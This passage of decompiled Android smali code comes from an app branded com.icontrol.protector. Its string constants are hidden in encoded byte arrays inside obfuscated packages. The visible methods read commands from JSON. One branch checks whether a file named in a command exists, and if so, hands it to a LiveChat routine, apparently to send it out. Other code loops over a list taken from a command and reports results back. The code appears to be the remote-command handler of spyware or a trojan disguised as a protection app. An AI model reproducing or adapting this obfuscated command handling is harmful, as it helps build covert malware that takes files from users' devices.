        -0x61t
        0x44t
        -0x8t
        0x4ct
        0x18t
        -0x2at
        -0x57t
        -0x1ft
    .end array-data

    :array_b
    .array-data 1
        0x6dt
        -0x1et
        0x7bt
    .end array-data

    :array_c
    .array-data 1
        0xct
        -0x7at
        0x1ft
        -0x6et
        -0xct
        0x4et
        -0x71t
        -0x1ft
    .end array-data

    :array_d
    .array-data 1
        -0x16t
        -0x9t
    .end array-data

    nop

    :array_e
    .array-data 1
        -0x68t
        -0x6et
        0x52t
        -0x69t
        0x34t
        0x42t
        -0xbt
        0x20t
    .end array-data

    :array_f
    .array-data 1
        -0x1ft
        0x11t
    .end array-data

    nop

    :array_10
    .array-data 1
        -0x73t
        0x61t
        0xat
        -0x54t
        0x45t
        0x3t
        -0x7ct
        -0x46t
    .end array-data

    :array_11
    .array-data 1
        0x5dt
        -0x11t
    .end array-data

    nop

    :array_12
    .array-data 1
        0x3et
        -0x61t
        -0x20t
        -0x6ct
        -0x5ct
        -0x69t
        0x6et
        -0x6ft
    .end array-data

    :array_13
    .array-data 1
        0x12t
        -0x62t
        0x4ct
        0x40t
        -0x71t
        -0x19t
        0x6et
        0x15t
    .end array-data

    :array_14
    .array-data 1
        0x25t
        0x7ft
        0x6t
        -0x3at
        -0x34t
        -0x9t
        -0xdt
        0x44t
    .end array-data

    :array_15
    .array-data 1
        0x64t
        -0x7dt
        0x70t
        0x72t
        0x63t
        0xdt
        -0x35t
        0x31t
    .end array-data

    :array_16
    .array-data 1
        0x35t
        -0xbt
        0x7dt
        0x40t
    .end array-data

    :array_17
    .array-data 1
        0x5bt
        -0x7ft
        0xft
        0x2bt
        -0xet
        0x1et
        0x7t
        0x3t
    .end array-data

    :array_18
    .array-data 1
        -0x36t
        0x20t
        0x7ct
        0x3at
        -0x46t
        0x11t
        -0x42t
        0x68t
    .end array-data

    :array_19
    .array-data 1
        0x19t
        -0x2ft
        0x4dt
        0x5t
    .end array-data

    :array_1a
    .array-data 1
        0x75t
        -0x5bt
        0x3ft
        0x6et
        -0x17t
        0x66t
        0x31t
        -0x65t
    .end array-data

    :array_1b
    .array-data 1
        0x46t
        -0x29t
        -0x1et
        -0x65t
        0x2ct
        -0x4et
        -0x65t
        -0x1bt
    .end array-data

    :array_1c
    .array-data 1
        0x42t
        0x2at
        -0x3dt
        0x60t
    .end array-data

    :array_1d
    .array-data 1
        0x2bt
        0x5et
        -0x4ft
        0xbt
        0x24t
        -0x4ft
        0x2et
        -0x3dt
    .end array-data

    :array_1e
    .array-data 1
        -0x75t
        -0x54t
        0x1bt
        0x73t
        -0x10t
        -0x7bt
        -0x7t
        0x2t
    .end array-data

    :array_1f
    .array-data 1
        0x60t
        -0x57t
        0x6bt
        0xbt
    .end array-data

    :array_20
    .array-data 1
        0xet
        -0x23t
        0x19t
        0x60t
        -0x61t
        0x6at
        -0x39t
        0x10t
    .end array-data

    :array_21
    .array-data 1
        0x70t
        -0x7bt
        -0x39t
        0x30t
        0x65t
        0x79t
        -0x45t
        0x73t
    .end array-data

    :array_22
    .array-data 1
        -0x34t
        0x16t
        0x7dt
        0x4bt
    .end array-data

    :array_23
    .array-data 1
        -0x60t
        0x70t
        0x12t
        0x39t
        -0x7at
        0x34t
        -0x29t
        -0x6ct
    .end array-data

    :array_24
    .array-data 1
        0x20t
        0x1ct
        0x19t
        0x17t
        -0x33t
        0x53t
        0x3ft
        0x14t
    .end array-data

    :array_25
    .array-data 1
        0x65t
        -0x3ct
        -0x4t
        0x36t
    .end array-data

    :array_26
    .array-data 1
        0x11t
        -0x43t
        -0x74t
        0x53t
        -0xet
        0x42t
        -0x1ft
        0x51t
    .end array-data

    :array_27
    .array-data 1
        -0x1bt
        -0x59t
        0x28t
        0x57t
        0x65t
        -0x5at
        -0x1at
        -0x3ct
    .end array-data

    :array_28
    .array-data 1
        -0x19t
        0x42t
        0x38t
        -0x6ft
    .end array-data

    :array_29
    .array-data 1
        -0x6dt
        0x3bt
        0x48t
        -0xct
        -0x62t
        -0x42t
        -0x21t
        -0x3ft
    .end array-data

    :array_2a
    .array-data 1
        0x57t
        -0x3at
        0x2t
        -0x12t
        0x7dt
        0x20t
        -0x11t
        0x65t
    .end array-data

    :array_2b
    .array-data 1
        0x23t
        -0x70t
        -0x42t
    .end array-data

    :array_2c
    .array-data 1
        0x48t
        -0xbt
        -0x39t
        0x7t
        0x8t
        0x15t
        0x40t
        0x52t
    .end array-data

    :array_2d
    .array-data 1
        0x4dt
        0x5t
        -0x5dt
        -0x63t
    .end array-data

    :array_2e
    .array-data 1
        0x2ft
        0x66t
        -0x34t
        -0x10t
        -0x7dt
        0x17t
        0x5ct
        0x77t
    .end array-data

    :array_2f
    .array-data 1
        0x7et
        -0x1et
        0x14t
        -0x7et
        0x49t
        -0xft
        -0x10t
        -0xat
    .end array-data

    :array_30
    .array-data 1
        0x53t
        0x2t
        0x4ft
        -0x1bt
        0x75t
        -0x48t
        0x67t
        0x6t
    .end array-data

    :array_31
    .array-data 1
        -0x34t
        0x49t
        0x51t
        -0x65t
        0x54t
        0x34t
        0x74t
        0x44t
    .end array-data

    :array_32
    .array-data 1
        -0x4dt
        0x32t
        -0x2at
        0x6dt
        0x4t
        -0xdt
        -0x76t
        0x3t
    .end array-data

    :array_33
    .array-data 1
        -0x65t
        -0x31t
        0x76t
        -0x48t
        -0x33t
        -0x5ft
        0x5t
    .end array-data

    :array_34
    .array-data 1
        -0x2t
        -0x49t
        0x2t
        -0x24t
        -0x54t
        -0x2bt
        0x64t
        -0x7dt
    .end array-data

    :array_35
    .array-data 1
        -0x5bt
        -0xft
        -0x7t
        -0x31t
        0x5dt
        0x16t
        0x2ft
        -0x49t
        -0x6at
        -0x52t
        -0x1et
        -0x76t
        0x6ft
        0x35t
        0x65t
        -0x44t
    .end array-data

    :array_36
    .array-data 1
        -0x39t
        -0x61t
        -0x51t
        -0x44t
        0x3ft
        0x52t
        0x58t
        -0x7ft
    .end array-data

    :array_37
    .array-data 1
        -0xct
        0x7et
        0x53t
        -0x7dt
        0x30t
        0x49t
    .end array-data

    nop

    :array_38
    .array-data 1
        -0x38t
        0x44t
        0x10t
        -0x30t
        0xat
        0x77t
        0x50t
        -0x2t
    .end array-data

    :array_39
    .array-data 1
        0x62t
        -0x4at
        0x75t
        0x5dt
        0x71t
        -0x7at
        0x64t
    .end array-data

    :array_3a
    .array-data 1
        0x7t
        -0x32t
        0x1t
        0x39t
        0x10t
        -0xet
        0x5t
        -0x71t
    .end array-data

    :array_3b
    .array-data 1
        0x65t
        -0x5at
        -0x77t
        0x1t
        -0x62t
        0x38t
        -0x5t
        0x0t
        0x48t
        -0x69t
        -0x1et
        0x5ft
        -0x61t
        0x42t
        -0x71t
        0x58t
        0x66t
        -0x57t
        -0x72t
        0x44t
        -0x5ct
        0x42t
        -0x71t
        0x42t
        0x54t
        -0x56t
        -0x55t
        0x75t
        -0x58t
        0xat
        -0x27t
        0x1dt
        0x66t
        -0x41t
        -0x1at
        0xct
    .end array-data

    :array_3c
    .array-data 1
        0x4t
        -0x12t
        -0x25t
        0x31t
        -0x3t
        0x70t
        -0x4at
        0x36t
    .end array-data

    :array_3d
    .array-data 1
        -0x2dt
        0x8t
        -0x68t
        0x7at
        0x19t
        -0x43t
    .end array-data

    nop

    :array_3e
    .array-data 1
        -0x11t
        0x32t
        -0x25t
        0x29t
        0x23t
        -0x7dt
        0x70t
        0x64t
    .end array-data

    :array_3f
    .array-data 1
        -0x1bt
        -0xct
        -0x46t
        0x6dt
        0x8t
        0x6at
        -0x15t
    .end array-data

    :array_40
    .array-data 1
        -0x73t
        -0x80t
        -0x32t
        0x1dt
        0x32t
        0x45t
        -0x3ct
        0x46t
    .end array-data

    :array_41
    .array-data 1
        0x6bt
        0x30t
        0x67t
        -0x39t
        -0x5et
        -0x9t
        0x32t
        0x10t
    .end array-data

    :array_42
    .array-data 1
        0x3t
        0x44t
        0x13t
        -0x49t
        -0x2ft
        -0x33t
        0x1dt
        0x3ft
    .end array-data

    :array_43
    .array-data 1
        0x44t
        -0x7dt
        0x36t
        0x64t
        -0x1at
        -0x4t
        0x19t
    .end array-data

    :array_44
    .array-data 1
        0x2ct
        -0x9t
        0x42t
        0x14t
        -0x24t
        -0x2dt
        0x36t
        0x47t
    .end array-data

    :array_45
    .array-data 1
        -0x53t
        0x60t
        0x3dt
        -0x7bt
        0x7et
        -0x76t
        0x31t
        0x4at
    .end array-data

    :array_46
    .array-data 1
        -0x22t
        0x14t
        0x5ct
        -0x9t
        0xat
        -0x1t
        0x43t
        0x26t
    .end array-data

    :array_47
    .array-data 1
        -0xct
        0x61t
    .end array-data

    nop

    :array_48
    .array-data 1
        -0x7ft
        0x0t
        0x7t
        -0x22t
        0x6ft
        -0x73t
        -0xet
        0x68t
    .end array-data

    :array_49
    .array-data 1
        0x59t
        -0xft
        0x41t
        -0x5ct
    .end array-data

    :array_4a
    .array-data 1
        0x35t
        -0x62t
        0x20t
        -0x40t
        0x53t
        0x29t
        -0x58t
        -0x2ft
    .end array-data

    :array_4b
    .array-data 1
        0x55t
        0x1et
        -0x40t
        -0x2t
        0x40t
        0x17t
        0x7et
        -0x59t
        0x72t
        0x8t
        -0x23t
        -0x1t
        0x5et
    .end array-data

    nop

    :array_4c
    .array-data 1
        0x1dt
        0x7ft
        -0x52t
        -0x66t
        0x2ct
        0x72t
        0x3ct
        -0x2bt
    .end array-data
.end method

.method private h(Lorg/json/JSONObject;)V
    .locals 7

    .line 1
    const/4 v0, 0x4

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v5, -0x80

    const/4 v6, 0x0

    aput-byte v5, v4, v6

    new-array v5, v1, [B

    fill-array-data v5, :array_2

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const v5, 0x1ab86

    if-eq v4, v5, :cond_1

    const v5, 0x2ff57c

    if-eq v4, v5, :cond_0

    goto :goto_0

    :cond_0
    new-array v4, v0, [B

    fill-array-data v4, :array_3

    new-array v5, v1, [B

    fill-array-data v5, :array_4

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v6, v3

    goto :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_2

    :cond_1
    const/4 v4, 0x3

    new-array v4, v4, [B

    fill-array-data v4, :array_5

    new-array v5, v1, [B

    fill-array-data v5, :array_6

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v6, -0x1

    :goto_1
    if-eqz v6, :cond_5

    if-eq v6, v3, :cond_3

    goto/16 :goto_3

    :cond_3
    const/16 v2, 0x9

    new-array v3, v2, [B

    fill-array-data v3, :array_7

    new-array v4, v1, [B

    fill-array-data v4, :array_8

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v4, v0, [B

    fill-array-data v4, :array_9

    new-array v5, v1, [B

    fill-array-data v5, :array_a

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x5

    new-array v4, v4, [B

    fill-array-data v4, :array_b

    new-array v5, v1, [B

    fill-array-data v5, :array_c

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v0, v0, [B

    fill-array-data v0, :array_d

    new-array v5, v1, [B

    fill-array-data v5, :array_e

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v4, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    new-instance v4, Ljava/io/File;

    invoke-virtual {v0}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_4

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0, p1}, Lcom/icontrol/protector/LiveChat;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_4
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v0, v2, [B

    fill-array-data v0, :array_f

    new-array v2, v1, [B

    fill-array-data v2, :array_10

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v4, 0x10

    new-array v4, v4, [B

    fill-array-data v4, :array_11

    new-array v5, v1, [B

    fill-array-data v5, :array_12

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_5
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/l;->c(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_13

    new-array v1, v1, [B

    fill-array-data v1, :array_14

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :goto_3
    return-void

    nop

    :array_0
    .array-data 1
        0x74t
        0x34t
        0x43t
        0x7at
    .end array-data

    :array_1
    .array-data 1
        0x7t
        0x41t
        0x21t
        0x19t
        -0x4at
        0x32t
        0x61t
        -0x7dt
    .end array-data

    :array_2
    .array-data 1
        -0x50t
        -0x5at
        0x73t
        0x6bt
        -0x5dt
        0x9t
        0x27t
        0x12t
    .end array-data

    :array_3
    .array-data 1
        -0xat
        0x30t
        0x4t
        0x7et
    .end array-data

    :array_4
    .array-data 1
        -0x70t
        0x59t
        0x68t
        0x1bt
        -0x53t
        -0x7dt
        0x27t
        -0x1at
    .end array-data

    :array_5
    .array-data 1
        -0x1ct
        -0x22t
        0x60t
    .end array-data

    :array_6
    .array-data 1
        -0x76t
        -0x55t
        0xdt
        0x29t
        0x53t
        -0x72t
        0x56t
        -0x79t
    .end array-data

    :array_7
    .array-data 1
        0x15t
        -0x61t
        0x2dt
        0x5t
        -0x53t
        0x3ft
        0x2bt
        0x7at
        0x11t
    .end array-data

    nop

    :array_8
    .array-data 1
        0x70t
        -0x19t
        0x59t
        0x77t
        -0x34t
        0x5bt
        0x4at
        0xet
    .end array-data

    :array_9
    .array-data 1
        -0x6at
        -0x24t
        0x67t
        0x32t
    .end array-data

    :array_a
    .array-data 1
        -0x8t
        -0x57t
        0xbt
        0x5et
        -0x4et
        -0x43t
        -0x61t
        -0x3ft
    .end array-data

    :array_b
    .array-data 1
        -0x46t
        0x22t
        -0x4et
        -0x78t
        0x1bt
    .end array-data

    nop

    :array_c
    .array-data 1
        -0x37t
        0x49t
        -0x25t
        -0x14t
        0x7dt
        0x43t
        0x54t
        0x6ft
    .end array-data

    :array_d
    .array-data 1
        0x3et
        0x33t
        0x5ft
        -0x4bt
    .end array-data

    :array_e
    .array-data 1
        0x50t
        0x46t
        0x33t
        -0x27t
        -0x21t
        0x76t
        0x3ft
        0x1et
    .end array-data

    :array_f
    .array-data 1
        0x17t
        -0x64t
        0x4ft
        -0x4at
        -0x36t
        0x55t
        -0x7t
        -0x1ct
        0x20t
    .end array-data

    nop

    :array_10
    .array-data 1
        0x53t
        -0xdt
        0x38t
        -0x28t
        -0x5at
        0x3at
        -0x68t
        -0x80t
    .end array-data

    :array_11
    .array-data 1
        0x65t
        -0x7dt
        0x39t
        0x21t
        0x1bt
        0x69t
        -0x41t
        0xbt
        0x3t
        -0x74t
        0x3at
        0x31t
        0x55t
        0x63t
        -0x16t
        0x5ft
    .end array-data

    :array_12
    .array-data 1
        0x23t
        -0x16t
        0x55t
        0x44t
        0x3bt
        0x7t
        -0x30t
        0x7ft
    .end array-data

    :array_13
    .array-data 1
        -0x1et
        -0x6t
        -0x20t
        0x57t
        0x12t
        -0x45t
        -0x34t
        0x6at
        -0x22t
        -0x8t
        -0x1at
    .end array-data

    :array_14
    .array-data 1
        -0x56t
        -0x65t
        -0x72t
        0x33t
        0x7et
        -0x22t
        -0x76t
        0xft
    .end array-data
.end method

.method private i(Lorg/json/JSONObject;)V
    .locals 10

    .line 1
    const/4 v0, 0x5

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v3, v0, [B

    fill-array-data v3, :array_2

    new-array v4, v1, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    new-array v4, v3, [B

    fill-array-data v4, :array_4

    new-array v5, v1, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v5, v0, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-array v5, v3, [B

    fill-array-data v5, :array_8

    new-array v6, v1, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v6, v1, [B

    fill-array-data v6, :array_b

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v5, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v5, v1, [B

    fill-array-data v5, :array_d

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    new-instance v0, Lntidisestablish/neumonoul/floccinaucinih/ua0;

    invoke-direct {v0}, Lntidisestablish/neumonoul/floccinaucinih/ua0;-><init>()V

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/16 v6, 0xc6c

    const/4 v7, 0x0

    const/4 v8, 0x1

    if-eq v5, v6, :cond_1

    const/16 v6, 0xc72

    if-eq v5, v6, :cond_0

    goto :goto_0

    :cond_0
    new-array v3, v3, [B

    fill-array-data v3, :array_e

    new-array v5, v1, [B

    fill-array-data v5, :array_f

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v8

    goto :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_7

    :cond_1
    new-array v3, v3, [B

    fill-array-data v3, :array_10

    new-array v5, v1, [B

    fill-array-data v5, :array_11

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v7

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v2, -0x1

    :goto_1
    const/4 v3, 0x0

    if-eqz v2, :cond_6

    if-eq v2, v8, :cond_3

    move-object p1, v3

    goto :goto_6

    :cond_3
    array-length v2, p1

    move-object v5, v3

    :goto_2
    if-ge v7, v2, :cond_4

    aget-object v6, p1, v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    invoke-virtual {v0, v6, v4}, Lntidisestablish/neumonoul/floccinaucinih/ua0;->q(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_3

    :catch_1
    move-exception v5

    :try_start_2
    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    :goto_3
    add-int/lit8 v7, v7, 0x1

    goto :goto_2

    :cond_4
    if-nez v5, :cond_5

    const/16 p1, 0xf

    new-array p1, p1, [B

    fill-array-data p1, :array_12

    new-array v0, v1, [B

    fill-array-data v0, :array_13

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_6

    :cond_5
    move-object p1, v5

    goto :goto_6

    :cond_6
    array-length v2, p1

    move-object v5, v3

    :goto_4
    if-ge v7, v2, :cond_7

    aget-object v6, p1, v7
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :try_start_3
    invoke-virtual {v0, v6, v4}, Lntidisestablish/neumonoul/floccinaucinih/ua0;->g(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_5

    :catch_2
    move-exception v5

    :try_start_4
    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    :goto_5
    add-int/lit8 v7, v7, 0x1

    goto :goto_4

    :cond_7
    if-nez v5, :cond_8

    const/16 p1, 0x10

    new-array p1, p1, [B

    fill-array-data p1, :array_14

    new-array v0, v1, [B

    fill-array-data v0, :array_15

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    move-object v9, v3

    move-object v3, p1

    move-object p1, v9

    goto :goto_6

    :cond_8
    move-object p1, v3

    move-object v3, v5

    :goto_6
    const/16 v0, 0x9

    if-eqz v3, :cond_9

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v4, v0, [B

    fill-array-data v4, :array_16

    new-array v5, v1, [B

    fill-array-data v5, :array_17

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4, v3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_9
    if-eqz p1, :cond_a

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v0, v0, [B

    fill-array-data v0, :array_18

    new-array v3, v1, [B

    fill-array-data v3, :array_19

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0, p1}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_8

    :goto_7
    const/16 v0, 0xd

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v1, v1, [B

    fill-array-data v1, :array_1b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_a
    :goto_8
    return-void

    nop

    :array_0
    .array-data 1
        -0x3t
        -0x3ct
        -0x80t
        0x71t
        -0x2at
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x72t
        -0x50t
        -0x1ft
        0x5t
        -0x4dt
        -0x36t
        -0x70t
        0x27t
    .end array-data

    :array_2
    .array-data 1
        -0x60t
        -0x62t
        -0x6dt
        0x17t
        -0x29t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x3bt
        -0xdt
        -0x1dt
        0x63t
        -0x52t
        -0x17t
        -0x14t
        -0x37t
    .end array-data

    :array_4
    .array-data 1
        -0x51t
        0x74t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x25t
        0x4t
        -0x53t
        0x60t
        0x14t
        -0x49t
        -0x11t
        0x8t
    .end array-data

    :array_6
    .array-data 1
        0x1ft
        -0x35t
        0x4dt
        -0xft
        -0x4at
    .end array-data

    nop

    :array_7
    .array-data 1
        0x7at
        -0x5at
        0x3dt
        -0x7bt
        -0x31t
        0xft
        0x2et
        0x6et
    .end array-data

    :array_8
    .array-data 1
        0x3ct
        -0x7t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x5at
        -0x77t
        0x57t
        -0x78t
        -0xdt
        0x7bt
        0x3at
        -0x51t
    .end array-data

    :array_a
    .array-data 1
        0x78t
        -0x79t
        0x2dt
        -0x6et
        0x4et
    .end array-data

    nop

    :array_b
    .array-data 1
        0x1dt
        -0x16t
        0x5dt
        -0x1at
        0x37t
        0x2ct
        0x58t
        0x74t
    .end array-data

    :array_c
    .array-data 1
        -0x16t
        -0xct
        0x17t
    .end array-data

    :array_d
    .array-data 1
        -0x2at
        -0x5ct
        0x29t
        0x4at
        0x1t
        -0x30t
        0x5at
        -0x2dt
    .end array-data

    :array_e
    .array-data 1
        0x56t
        -0x2bt
    .end array-data

    nop

    :array_f
    .array-data 1
        0x35t
        -0x60t
        -0xbt
        0x75t
        -0x64t
        0x1et
        0x38t
        0x7dt
    .end array-data

    :array_10
    .array-data 1
        -0x1ct
        0x10t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x79t
        0x7ft
        -0x4et
        0x63t
        0x1at
        -0x8t
        -0x11t
        0x7ct
    .end array-data

    :array_12
    .array-data 1
        -0x3et
        0x1et
        0x8t
        -0x7bt
        0x78t
        -0x72t
        -0x2ct
        0x50t
        -0x1at
        0x1ft
        0x17t
        -0x61t
        0x7et
        -0x74t
        -0x70t
    .end array-data

    :array_13
    .array-data 1
        -0x71t
        0x71t
        0x7et
        -0x14t
        0x16t
        -0x17t
        -0xct
        0x36t
    .end array-data

    :array_14
    .array-data 1
        0x32t
        -0x4t
        -0x53t
        -0x3t
        -0x42t
        -0x59t
        0x4t
        0x4bt
        0x17t
        -0x6t
        -0x4dt
        -0x13t
        -0x5ct
        -0x5ft
        0x6t
        0xft
    .end array-data

    :array_15
    .array-data 1
        0x71t
        -0x6dt
        -0x23t
        -0x7ct
        -0x29t
        -0x37t
        0x63t
        0x6bt
    .end array-data

    :array_16
    .array-data 1
        -0x4at
        0x6ct
        -0x6at
        0x1bt
        -0x5bt
        0x54t
        -0x13t
        0x78t
        -0x70t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0xbt
        0x3t
        -0x1at
        0x62t
        -0x7bt
        0x12t
